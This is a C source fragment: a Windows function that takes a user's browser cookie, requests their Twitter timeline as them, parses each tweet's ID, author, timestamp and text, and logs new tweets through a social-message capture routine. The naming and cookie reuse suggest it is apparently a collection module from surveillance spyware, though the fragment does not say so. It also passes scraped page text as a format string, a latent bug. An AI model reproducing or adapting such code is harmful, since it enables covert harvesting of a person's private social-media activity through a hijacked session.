DWORD ParseTweet(char *user, char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2;
	WCHAR twitter_request[256];
	char tweet_body[2048];
	char tweet_id[256];
	char tweet_ts[256];
	char screen_name[256];
	char tweet_author[256];
	char tweet_timestamp[256];
	ULARGE_INTEGER act_tstamp;
	DWORD last_tstamp_hi, last_tstamp_lo;
	struct tm tstamp;

	/*	since the first tweet of this batch will have a higher timestamp, 
		save it to update social status at the end of the batch  */
	DWORD dwHigherBatchTimestamp = 0;

	last_tstamp_lo = GetLastFBTstamp(user, &last_tstamp_hi);
	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);

	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *)r_buffer;
	
	/* loop through tweets retrieved from timeline, html structure for a tweet 
		1] body
		2] tweet id
		3] author
		4] timestamp
	*/
	for (;;) {
		/* 2] tweet id
			e.g. data-tweet-id="526625177615220736"
		*/
		parser1 = strstr(parser1, TWITTER_TWEET_ID_START);
		if( !parser1 )
			break;
		
		parser1 += strlen(TWITTER_TWEET_ID_START);
		parser2 = strchr(parser1, '"');

		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(tweet_id, sizeof(tweet_id), _TRUNCATE, parser1);
		parser1 = parser2 + 1;

		/* 3] tweet author and display name
			e.g. data-screen-name="TheEconomist" data-name="The Economist" data-user-id="5988062"
		*/
		parser1 = strstr(parser1, TWITTER_TWEET_AUTHOR_START);
		if( !parser1 )
			break;

		parser1 += strlen(TWITTER_TWEET_AUTHOR_START);
		parser2 = strchr(parser1, '"');

		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(tweet_author, sizeof(tweet_author), _TRUNCATE, parser1);
		parser1 = parser2 + 1;

		parser1 = strstr(parser1, TWITTER_TWEET_DISPLAY_NAME_START);
		if( !parser1 )
			break;

		parser1 += strlen(TWITTER_TWEET_DISPLAY_NAME_START);
		parser2 = strchr(parser1, '"');

		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, parser1);
		parser1 = parser2 + 1;

		/* 4] timestamp
			e.g.  data-time="1414392201"
		*/
		parser1 = strstr(parser1, TWITTER_TWEET_TIMESTAMP_START);
		if( !parser1 )
			break;

		parser1 += strlen(TWITTER_TWEET_TIMESTAMP_START);
		parser2 = strchr(parser1, '"');

		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(tweet_timestamp, sizeof(tweet_timestamp), _TRUNCATE, parser1);
		parser1 = parser2 + 1;

		/* 1] tweet body: 
		   e.g. <p class="js-tweet-text tweet-text" lang="en" data-aria-label-part="0">BODY</p>
		   a) find start of <p>, and then reach the end of <p>
		   b) find </p>
		*/
		parser1 = strstr(parser1, TWITTER_TWEET_START);
		if( !parser1 )
			break;

		parser1 = strchr(parser1, '>');
		if( !parser1 )
			break;

		parser1 += 1;
		parser2 = strstr(parser1, TWITTER_TWEET_END);

		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(tweet_body, sizeof(tweet_body), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		/* if the tweet is new save it , discard otherwise */
		if (!atoi(tweet_timestamp))
			continue;
		
		sscanf_s(tweet_timestamp, "%llu", &act_tstamp);
		
		if( act_tstamp.LowPart > 2000000000 || act_tstamp.LowPart <= last_tstamp_lo)
			continue;

		/* should hold true only for the first tweet in the batch */
		if( act_tstamp.LowPart > dwHigherBatchTimestamp )
			dwHigherBatchTimestamp = act_tstamp.LowPart; 

		_gmtime32_s(&tstamp, (__time32_t *)&act_tstamp);
		tstamp.tm_year += 1900;
		tstamp.tm_mon++;
		LogSocialIMMessageA(CHAT_PROGRAM_TWITTER, "", "", screen_name, "", tweet_body, &tstamp, FALSE); 	
	}

	SetLastFBTstamp(user, dwHigherBatchTimestamp, 0);

	SAFE_FREE(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}